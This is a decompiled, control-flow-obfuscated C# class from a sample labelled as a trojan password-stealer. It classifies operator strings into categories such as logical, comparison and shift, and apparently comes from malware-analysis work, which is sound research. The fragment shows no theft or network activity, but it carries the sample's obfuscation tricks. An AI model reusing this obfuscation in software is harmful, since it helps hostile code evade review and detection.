// Decompiled with JetBrains decompiler
// Type: wG.CGF
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace wG
{
  public class CGF : tc, Au
  {
    private static CGF wiw;

    [CompilerGenerated]
    [SpecialName]
    public Xp f19() => this.xju;

    [CompilerGenerated]
    [SpecialName]
    public void J1F(Xp _param1) => this.xju = _param1;

    [CompilerGenerated]
    [SpecialName]
    public string XjY() => this.ojW;

    [CompilerGenerated]
    [SpecialName]
    public void PjQ(string _param1) => this.ojW = _param1;

    [SpecialName]
    public gGG Gj1()
    {
      List<string> stringList1 = new List<string>((IEnumerable<string>) new string[2]
      {
        "&&",
        "||"
      });
      List<string> stringList2 = new List<string>((IEnumerable<string>) new string[3]
      {
        "^",
        "&",
        "|"
      });
      List<string> stringList3 = new List<string>((IEnumerable<string>) new string[6]
      {
        "!=",
        "==",
        "<=",
        ">=",
        "<",
        ">"
      });
      List<string> stringList4 = new List<string>((IEnumerable<string>) new string[2]
      {
        ">>",
        "<<"
      });
      List<string> stringList5 = new List<string>((IEnumerable<string>) new string[2]
      {
        "+",
        "-"
      });
      List<string> stringList6 = new List<string>((IEnumerable<string>) new string[3]
      {
        "*",
        "/",
        "%"
      });
      if (!stringList5.Contains(this.XjY()))
        goto label_10;
      else
        goto label_14;
label_1:
      int num1;
      int num2 = num1;
label_2:
      gGG gGg;
      bool flag1;
      bool flag2;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_16;
          case 2:
            goto label_11;
          case 3:
            if (!stringList2.Contains(this.XjY()))
            {
              flag1 = stringList4.Contains(this.XjY());
              if (CGF.lio())
              {
                num2 = 1;
                continue;
              }
              goto label_1;
            }
            else
              goto label_21;
          case 4:
            if (!flag2)
            {
              num2 = 7;
              continue;
            }
            goto label_6;
          case 5:
            goto label_12;
          case 6:
            goto label_8;
          case 7:
            if (stringList3.Contains(this.XjY()))
            {
              gGg = gGG.Comparisson;
              if (CGF.lio())
              {
                num2 = 0;
                continue;
              }
              goto label_1;
            }
            else
            {
              if (!stringList1.Contains(this.XjY()))
              {
                num2 = 3;
                continue;
              }
              goto label_8;
            }
          default:
            goto label_3;
        }
      }
label_3:
      return gGg;
label_6:
      gGg = gGG.Product;
      goto label_3;
label_8:
      gGg = gGG.Logical;
      goto label_3;
label_11:
      gGg = gGG.Sum;
      goto label_3;
label_12:
      gGg = gGG.Undetermined;
      goto label_3;
label_16:
      if (!flag1)
      {
        num1 = 5;
        goto label_1;
      }
      else
      {
        gGg = gGG.Shift;
        goto label_3;
      }
label_21:
      gGg = gGG.Bitwise;
      goto label_3;
label_10:
      flag2 = stringList6.Contains(this.XjY());
      num2 = 4;
      if (CGF.lio())
        goto label_2;
      else
        goto label_1;
label_14:
      num2 = CGF.Ri5() != null ? 1 : 2;
      goto label_2;
    }

    public override string ToString() => this.XjY();

    public CGF()
    {
      XTG.fvQjdC();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool lio() => CGF.wiw == null;

    internal static CGF Ri5() => CGF.wiw;
  }
}
